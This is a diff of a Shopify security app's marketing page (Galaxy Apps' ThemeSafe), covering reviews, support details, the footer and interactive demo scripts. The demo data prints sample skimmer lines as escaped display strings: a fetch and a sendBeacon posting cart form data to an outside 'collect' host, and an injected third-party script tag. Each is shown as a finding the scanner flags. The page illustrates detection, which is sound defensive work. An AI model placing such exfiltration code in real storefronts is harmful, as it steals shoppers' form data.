-                <span class="stars" aria-label="5 out of 5 stars">★★★★★</span>
-                <span class="verified-pill">✓ Verified on Shopify</span>
-              </div>
-              <blockquote>
-                “It helps me stay assured that each theme update is working as expected while giving me full visibility to confirm the changes.”
-              </blockquote>
-              <div class="review-who">
-                <span class="avatar" style="background: #c2703d">LA</span>
-                <div>
-                  <b>LittleAngelDreams</b>
-                  <span>United States · July 2026 · ThemeSafe Security</span>
-                </div>
-              </div>
-            </article>
-          </div>
-          <p class="reviews-foot rv">
-            Read all verified merchant reviews on the
-            <a href="https://apps.shopify.com/themesafe-security" target="_blank" rel="noopener">Shopify App Store →</a>
-          </p>
-        </div>
-      </section>
-
-      <!-- ================= ABOUT + SUPPORT ================= -->
-      <section class="section" id="about" style="padding-top: 20px">
-        <div class="wrap">
-          <div class="about-grid">
-            <div class="rv">
-              <span class="label">About Galaxy Apps</span>
-              <h2>An independent Shopify product studio in Hanoi, building since 2023</h2>
+          <div class="bezel-shell rv" id="support">
+            <div class="bezel-core support-card-inner">
+              <h3>Direct engineering support</h3>
               <p>
-                Galaxy Apps is a <strong>software product company</strong> headquartered in Hanoi, Vietnam. We focus exclusively on designing, building, and maintaining proprietary SaaS apps for the Shopify ecosystem.
+                Every support request goes straight to the product engineers who build ThemeSafe and OrderSafe.
               </p>
-              <p>
-                Our flagship product, <strong>ThemeSafe Security</strong>, combines deterministic static code analysis with AI security reasoning to inspect storefront Liquid and JavaScript code — giving independent merchants automated protection that previously required a dedicated security engineer.
-              </p>
-              <p>
-                From our first release, <em>ThemeSafe ‑ Auto Backup</em> in November 2023, to our AI-powered security and order protection suite today, every app is engineered for reliability, zero storefront bloat, and strict merchant data privacy.
-              </p>
-            </div>
-            <div class="principles rv">
-              <div class="principle">
-                <b>Automatic by default</b>
-                <span>Protection that requires manual babysitting fails when you need it most. Our apps run on schedule and via real-time Shopify webhooks.</span>
-              </div>
-              <div class="principle">
-                <b>Actionable AI, not noise</b>
-                <span>Security findings are written for store owners and developers alike: which file changed, why it looks suspicious, and how to remediate it.</span>
-              </div>
-              <div class="principle">
-                <b>Strict data minimization</b>
-                <span>Backups can sync directly to your own Google Drive or Dropbox. We only access the Shopify API scopes needed to run the app you installed.</span>
-              </div>
-            </div>
-          </div>
 
-          <div class="support-band rv" id="support" style="margin-top: 64px">
-            <div>
-              <h2>Need help with one of our apps?</h2>
-              <p>
-                Engineers from the product team answer support directly — within one business day on all plans, and 24/7 for Enterprise merchants.
-              </p>
+              <div class="sla-list tabular">
+                <div class="sla-row">
+                  <span>Standard response SLA</span>
+                  <strong>&lt; 1 business day</strong>
+                </div>
+                <div class="sla-row">
+                  <span>Enterprise plan coverage</span>
+                  <strong>24/7 priority</strong>
+                </div>
+                <div class="sla-row">
+                  <span>Direct support channel</span>
+                  <strong>support@galaxy-apps.com</strong>
+                </div>
+              </div>
+
+              <a class="btn-island" href="mailto:support@galaxy-apps.com">
+                <span>Email Engineering Support</span>
+                <span class="btn-pod" aria-hidden="true">
+                  <svg width="14" height="14" viewBox="0 0 256 256" fill="none" stroke="currentColor" stroke-width="22" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="64" y1="192" x2="192" y2="64" />
+                    <polyline points="88 64 192 64 192 168" />
+                  </svg>
+                </span>
+              </a>
             </div>
-            <a class="btn btn-primary" href="mailto:support@galaxy-apps.com">support@galaxy-apps.com</a>
           </div>
         </div>
       </section>
     </main>
 
     <!-- ================= FOOTER ================= -->
-    <footer>
+    <footer class="site-footer">
       <div class="wrap">
-        <div class="foot-grid">
-          <div class="foot-brand">
-            <a class="brand" href="#top" style="margin-bottom: 14px">
-              <svg class="mark" viewBox="0 0 36 36" aria-hidden="true" style="width: 32px; height: 32px">
-                <rect width="36" height="36" rx="9" fill="#0a1628" />
+        <div class="footer-grid">
+          <div class="footer-brand">
+            <a class="brand" href="#main-content">
+              <svg class="brand-mark" viewBox="0 0 36 36" aria-hidden="true">
+                <rect width="36" height="36" rx="10" fill="#0a1628" />
                 <path d="M18 6.5l2.5 6.3 6.3 2.5-6.3 2.5L18 24l-2.5-6.2-6.3-2.5 6.3-2.5z" fill="#2dd4bf" />
                 <circle cx="27" cy="25.5" r="1.8" fill="#f5b544" />
                 <circle cx="9" cy="9" r="1.2" fill="#e8f2fd" />
               </svg>
               <span>Galaxy Apps</span>
             </a>
-            <p>Shopify apps that protect your store — automatic backups and AI-powered theme security, built in Hanoi for merchants worldwide.</p>
+            <p>
+              Automated backups and AI-powered theme security for Shopify stores, built in Hanoi for merchants worldwide.
+            </p>
           </div>
 
-          <div>
+          <div class="footer-col">
             <h4>Products</h4>
             <ul>
-              <li><a href="https://apps.shopify.com/themesafe-security" target="_blank" rel="noopener">ThemeSafe ‑ Security ‑ Review</a></li>
-              <li><a href="https://apps.shopify.com/theme-backup-1" target="_blank" rel="noopener">ThemeSafe ‑ Auto Backup</a></li>
-              <li><a href="https://apps.shopify.com/ordersafe-auto-backup" target="_blank" rel="noopener">OrderSafe ‑ Auto Backup</a></li>
-              <li><a href="https://apps.shopify.com/partners/susu5" target="_blank" rel="noopener">Shopify Partner Profile →</a></li>
+              <li><a href="https://apps.shopify.com/themesafe-security" target="_blank" rel="noopener">ThemeSafe - Security - Review</a></li>
+              <li><a href="https://apps.shopify.com/theme-backup-1" target="_blank" rel="noopener">ThemeSafe - Auto Backup</a></li>
+              <li><a href="https://apps.shopify.com/ordersafe-auto-backup" target="_blank" rel="noopener">OrderSafe - Auto Backup</a></li>
+              <li><a href="https://apps.shopify.com/partners/susu5" target="_blank" rel="noopener">Shopify Partner Profile</a></li>
             </ul>
           </div>
 
-          <div>
-            <h4>Privacy &amp; Legal</h4>
+          <div class="footer-col">
+            <h4>Privacy &amp; Compliance</h4>
             <ul>
               <li><a href="privacy.html">Privacy Policy Overview</a></li>
               <li><a href="privacy.html#themesafe-security">ThemeSafe Security Privacy</a></li>
@@ -1851,136 +1890,240 @@
             </ul>
           </div>
 
-          <div>
-            <h4>Contact &amp; HQ</h4>
+          <div class="footer-col">
+            <h4>Headquarters &amp; Contact</h4>
             <ul>
               <li><a href="mailto:support@galaxy-apps.com">support@galaxy-apps.com</a></li>
-              <li><a href="tel:+84967741098">+84 967 741 098</a></li>
+              <li><a href="tel:+84967741098" class="tabular">+84 967 741 098</a></li>
               <li>9F, Song Hong Building, 165 Thai Ha,<br />Dong Da District, Hanoi, Vietnam</li>
             </ul>
           </div>
         </div>
 
-        <div class="foot-bottom">
-          <span>© 2023–2026 Galaxy Apps. All rights reserved.</span>
-          <span>Independent SaaS Product Studio · Built for Shopify Merchants Worldwide</span>
+        <div class="footer-bottom">
+          <span>© 2023-2026 Galaxy Apps. All rights reserved.</span>
+          <span>Independent SaaS Product Studio · Hanoi, Vietnam</span>
         </div>
       </div>
     </footer>
 
     <script>
-      // Header shadow on scroll
-      var header = document.getElementById('siteHeader');
-      function onScroll() {
-        header.classList.toggle('scrolled', window.scrollY > 8);
-      }
-      window.addEventListener('scroll', onScroll, { passive: true });
-      onScroll();
+      // 1. Theme initialization & toggle (Page Theme Lock: entire page switches cohesively)
+      (function () {
+        var root = document.documentElement;
+        var saved = localStorage.getItem('galaxy_theme');
+        if (saved === 'light' || saved === 'dark') {
+          root.setAttribute('data-theme', saved);
+        } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: light)').matches) {
+          root.setAttribute('data-theme', 'light');
+        }
+        var themeBtn = document.getElementById('themeToggle');
+        if (themeBtn) {
+          themeBtn.addEventListener('click', function () {
+            var next = root.getAttribute('data-theme') === 'light' ? 'dark' : 'light';
+            root.setAttribute('data-theme', next);
+            localStorage.setItem('galaxy_theme', next);
+          });
+        }
+      })();
 
-      // Mobile nav
-      var toggle = document.getElementById('navToggle');
-      var nav = document.getElementById('mainNav');
-      toggle.addEventListener('click', function () {
-        var open = nav.classList.toggle('open');
-        toggle.setAttribute('aria-expanded', open ? 'true' : 'false');
+      // 2. Mobile menu toggle
+      var navToggle = document.getElementById('navToggle');
+      var mainNav = document.getElementById('mainNav');
+      navToggle.addEventListener('click', function () {
+        var open = mainNav.classList.toggle('open');
+        navToggle.setAttribute('aria-expanded', open ? 'true' : 'false');
       });
-      nav.addEventListener('click', function (e) {
+      mainNav.addEventListener('click', function (e) {
         if (e.target.tagName === 'A') {
-          nav.classList.remove('open');
-          toggle.setAttribute('aria-expanded', 'false');
+          mainNav.classList.remove('open');
+          navToggle.setAttribute('aria-expanded', 'false');
         }
       });
 
-      // Reveal on scroll (with fallback so content is never stuck hidden)
+      // 3. IntersectionObserver for Navbar Elevation & Scroll Reveals (zero scroll listeners)
+      var islandHeader = document.getElementById('islandHeader');
+      var navSentinel = document.getElementById('navSentinel');
+      if ('IntersectionObserver' in window && navSentinel) {
+        var navObserver = new IntersectionObserver(
+          function (entries) {
+            islandHeader.classList.toggle('elevated', !entries[0].isIntersecting);
+          },
+          { threshold: 0 }
+        );
+        navObserver.observe(navSentinel);
+      }
+
       var reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
       var rvEls = document.querySelectorAll('.rv');
-      function revealAll() {
+      function showAll() {
         rvEls.forEach(function (el) {
           el.classList.add('in');
         });
       }
       if (!reduceMotion && 'IntersectionObserver' in window) {
-        var io = new IntersectionObserver(
+        var revealObserver = new IntersectionObserver(
           function (entries) {
             entries.forEach(function (en) {
               if (en.isIntersecting) {
                 en.target.classList.add('in');
-                io.unobserve(en.target);
+                revealObserver.unobserve(en.target);
               }
             });
           },
-          { threshold: 0, rootMargin: '0px 0px 160px 0px' }
+          { threshold: 0.08, rootMargin: '0px 0px 100px 0px' }
         );
         rvEls.forEach(function (el) {
-          io.observe(el);
+          revealObserver.observe(el);
         });
-        setTimeout(revealAll, 2200);
+        setTimeout(showAll, 2000);
       } else {
-        revealAll();
+        showAll();
       }
 
-      // Spotlight interactive step tabs
-      var stepsData = [
+      // 4. Interactive Hero ThemeSafe Live Scanner
+      var heroFiles = [
         {
-          tag: 'Step 1',
-          cls: 'tag-ok',
-          fileLabel: 'layout / theme.liquid · Read-only OAuth sync',
-          badge: '312 files indexed',
-          badgeCls: 'tag tag-ok',
-          panel:
-            'Connected securely through the Shopify Admin API — ThemeSafe indexed 312 Liquid, JSON, and JavaScript files in 3.4 seconds without affecting storefront speed.',
-          title: 'Built for merchants who customize themes often',
-          text: 'Every time an agency, freelancer, or third-party app touches your theme, there is a risk of leftover tracking scripts, broken Liquid tags, or silent skimmers. ThemeSafe keeps a continuous security audit running between your edits.'
+          score: 'Score 92/100',
+          scoreCls: 'status-chip chip-risk tabular',
+          lines: [
+            { ln: '40', code: 'const cartForm = document.querySelector(\'form[action="/cart"]\');', cls: '' },
+            { ln: '41', code: 'if (cartForm) {', cls: '' },
+            {
+              ln: '42',
+              code: "  fetch('https://cdn.quick-deals-track.net/collect', { method: 'POST', body: new FormData(cartForm) });",
+              cls: 'flagged-risk'
+            },
+            { ln: '43', code: '}', cls: '' }
+          ],
+          title: 'AI Security Finding: Unverified outbound payload',
+          meta: 'Rule #TS-402',
+          body: 'Line 42 serializes cart form inputs and posts them to an external domain registered 4 days ago. ThemeSafe flagged this edit within 30 seconds of saving.'
         },
         {
-          tag: 'Step 2',
-          cls: 'tag-ai',
-          fileLabel: 'layout / theme.liquid · Hybrid Rule + AI Engine',
-          badge: '1 critical risk',
-          badgeCls: 'tag tag-risk',
-          panel:
-            'Static rules flagged 3 external scripts; AI contextual analysis cleared 2 verified Shopify App Embeds and isolated 1 unauthorized script exfiltrating form inputs.',
-          title: 'Rules catch known signatures. AI catches the rest.',
-          text: 'Regex rules are fast but blind to intent. ThemeSafe pairs deterministic rules with an AI code reviewer that analyzes what a script loads, where it sends data, and whether it belongs in a Shopify storefront.'
+          score: 'Score 96/100',
+          scoreCls: 'status-chip chip-warn tabular',
+          lines: [
+            { ln: '18', code: '<header class="site-header" data-section-id="{{ section.id }}">', cls: '' },
+            {
+              ln: '19',
+              code: '  <script src="https://widget.partner-upsell-app.io/embed.js" async><\/script>',
+              cls: 'flagged-warn'
+            },
+            { ln: '20', code: "  {% render 'header-drawer' %}", cls: '' },
+            { ln: '21', code: '</header>', cls: '' }
+          ],
+          title: 'AI Security Finding: Legacy third-party script tag',
+          meta: 'Rule #TS-118',
+          body: 'Line 19 loads an external script directly in Liquid instead of using a Shopify App Embed block. Review recommended if you uninstalled this upsell app.'
         },
         {
-          tag: 'Step 3',
-          cls: 'tag-warn',
-          fileLabel: 'Webhook event: themes/update · Diff #849',
-          badge: 'Alert dispatched',
-          badgeCls: 'tag tag-warn',
-          panel:
-            'Instant alert delivered: "assets/promo-popup.js modified outside scheduled maintenance window — High Risk." One click opens the exact line-by-line code diff.',
-          title: 'Know within minutes, not weeks after the damage',
-          text: 'Injected scripts and malicious redirects operate quietly until customers complain. Real-time webhook monitoring alerts you while the change is fresh and immediately reversible.'
+          score: 'Score 100/100',
+          scoreCls: 'status-chip chip-clean tabular',
+          lines: [
+            { ln: '11', code: '<head>', cls: '' },
+            { ln: '12', code: '  {{ content_for_header }}', cls: '' },
+            {
+              ln: '13',
+              code: '  <script src="{{ \'global.js\' | asset_url }}" defer="defer"><\/script>',
+              cls: 'flagged-clean'
+            },
+            { ln: '14', code: '</head>', cls: '' }
+          ],
+          title: 'AI Security Finding: Verified Shopify asset pipeline',
+          meta: '312 / 312 Clean',
+          body: 'All scripts in layout/theme.liquid resolve to first-party Shopify CDN assets with no unauthorized external network calls.'
         }
       ];
-      var stepBtns = document.querySelectorAll('.step-btn');
-      var panelText = document.getElementById('stepPanelText');
-      var panelTag = document.querySelector('#stepPanel .tag');
-      var cpFileLabel = document.getElementById('cpFileLabel');
-      var cpBadge = document.getElementById('cpBadge');
-      var spotTitle = document.getElementById('spotTitle');
-      var spotText = document.getElementById('spotText');
-      stepBtns.forEach(function (btn) {
+
+      var fileTabs = document.querySelectorAll('.file-tab');
+      var heroCodeView = document.getElementById('heroCodeView');
+      var heroScanScore = document.getElementById('heroScanScore');
+      var heroVerdictTitle = document.getElementById('heroVerdictTitle');
+      var heroVerdictMeta = document.getElementById('heroVerdictMeta');
+      var heroVerdictBody = document.getElementById('heroVerdictBody');
+
+      fileTabs.forEach(function (tab) {
+        tab.addEventListener('click', function () {
+          fileTabs.forEach(function (t) {
+            t.classList.remove('active');
+            t.setAttribute('aria-selected', 'false');
+          });
+          tab.classList.add('active');
+          tab.setAttribute('aria-selected', 'true');
+          var item = heroFiles[Number(tab.getAttribute('data-file'))];
+          heroScanScore.textContent = item.score;
+          heroScanScore.className = item.scoreCls;
+          heroVerdictTitle.textContent = item.title;
+          heroVerdictMeta.textContent = item.meta;
+          heroVerdictBody.textContent = item.body;
+          heroCodeView.innerHTML = item.lines
+            .map(function (l) {
+              var escaped = l.code.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+              return (
+                '<div class="code-line ' +
+                l.cls +
+                '"><span class="ln">' +
+                l.ln +
+                '</span><span>' +
+                escaped +
+                '</span></div>'
+              );
+            })
+            .join('');
+        });
+      });
+
+      // 5. Interactive Workbench Pipeline Switcher
+      var wbStages = [
+        {
+          header: 'layout/theme.liquid · OAuth Snapshot #312',
+          badge: '312 Files Indexed',
+          badgeCls: 'status-chip chip-clean',
+          code: '&lt;!-- Dawn 15.2.0 · Read-only Shopify Admin API sync --&gt;\n&lt;script src="{{ \'constants.js\' | asset_url }}" defer="defer"&gt;&lt;/script&gt;\n&lt;script src="{{ \'pubsub.js\' | asset_url }}" defer="defer"&gt;&lt;/script&gt;\n<span class="diff-added">+ Indexed 312 Liquid, JSON, and JS files in 3.4s (0 storefront scripts added)</span>\n&lt;script src="{{ \'global.js\' | asset_url }}" defer="defer"&gt;&lt;/script&gt;',
+          title: 'Zero-configuration onboarding for non-technical store owners',
+          body: 'ThemeSafe connects strictly through scoped Shopify Admin APIs. You never have to paste tracking snippets or edit theme files to start scanning.'
+        },
+        {
+          header: 'assets/promo-popup.js · Hybrid AST + AI Review',
+          badge: '1 Critical Finding',
+          badgeCls: 'status-chip chip-risk',
+          code: '// Evaluated by Static Rule #TS-402 + Contextual AI Reviewer\nconst payload = new FormData(document.querySelector(\'form[action="/cart"]\'));\n<span class="diff-removed">- navigator.sendBeacon(\'https://cdn.quick-deals-track.net/collect\', payload);</span>\n<span class="diff-added">+ // Flagged: Unauthorized exfiltration of cart form inputs (Risk 9.1/10)</span>',
+          title: 'Deterministic rules catch known signatures. AI catches intent.',
+          body: 'Static regex rules flag external domains in milliseconds, while our AI model reads surrounding code to distinguish legitimate Shopify App Embeds from data skimmers.'
+        },
+        {
+          header: 'Webhook: themes/update · Diff #849',
+          badge: 'Alert Dispatched',
+          badgeCls: 'status-chip chip-warn',
+          code: 'Event: themes/update received at 02:14 UTC\nModified asset: sections/header-group.json\n<span class="diff-removed">- "custom_liquid": ""</span>\n<span class="diff-added">+ "custom_liquid": "&lt;script src=\\"https://unverified-cdn.net/tag.js\\"&gt;&lt;/script&gt;"</span>',
+          title: 'Know within minutes, not weeks after the damage',
+          body: 'Injected scripts operate silently until customers complain. Real-time webhook monitoring alerts you while the edit is fresh and immediately reversible.'
+        }
+      ];
+
+      var pipelineBtns = document.querySelectorAll('.pipeline-btn');
+      var wbFileHeader = document.getElementById('wbFileHeader');
+      var wbStatusBadge = document.getElementById('wbStatusBadge');
+      var wbCodeBlock = document.getElementById('wbCodeBlock');
+      var wbNoteTitle = document.getElementById('wbNoteTitle');
+      var wbNoteBody = document.getElementById('wbNoteBody');
+
+      pipelineBtns.forEach(function (btn) {
         btn.addEventListener('click', function () {
-          stepBtns.forEach(function (b) {
-            b.classList.remove('on');
+          pipelineBtns.forEach(function (b) {
+            b.classList.remove('active');
             b.setAttribute('aria-selected', 'false');
           });
-          btn.classList.add('on');
+          btn.classList.add('active');
           btn.setAttribute('aria-selected', 'true');
-          var d = stepsData[Number(btn.getAttribute('data-step'))];
-          panelText.textContent = d.panel;
-          panelTag.textContent = d.tag;
-          panelTag.className = 'tag ' + d.cls;
-          panelTag.style.flex = 'none';
-          panelTag.style.marginTop = '2px';
-          cpFileLabel.textContent = d.fileLabel;
-          cpBadge.textContent = d.badge;
-          cpBadge.className = d.badgeCls;
-          spotTitle.textContent = d.title;
-          spotText.textContent = d.text;
+          var s = wbStages[Number(btn.getAttribute('data-stage'))];
+          wbFileHeader.textContent = s.header;
+          wbStatusBadge.textContent = s.badge;
+          wbStatusBadge.className = s.badgeCls;
+          wbCodeBlock.innerHTML = '<code>' + s.code + '</code>';
+          wbNoteTitle.textContent = s.title;
+          wbNoteBody.textContent = s.body;
         });
       });
     </script>
